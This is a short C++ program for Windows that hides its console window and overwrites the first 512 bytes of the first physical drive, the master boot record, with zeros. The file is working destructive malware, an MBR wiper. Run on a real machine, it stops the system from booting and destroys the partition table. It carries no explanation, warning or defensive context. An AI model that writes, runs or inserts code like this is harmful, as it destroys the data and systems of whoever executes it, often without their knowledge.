#include <Windows.h>
#include <iostream>

using namespace std;

#define MBR_SIZE 512
int main()
{
	FreeConsole();
	DWORD write;
	char mbrData[MBR_SIZE];
	
	ZeroMemory(&mbrData, (sizeof mbrData));
	
	HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0"
		, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE
		, NULL, OPEN_EXISTING, NULL, NULL);
		if (WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL) == TRUE) {
			ExitProcess(0);
		}
	CloseHandle(MasterBootRecord);
	return EXIT_SUCCESS;
}
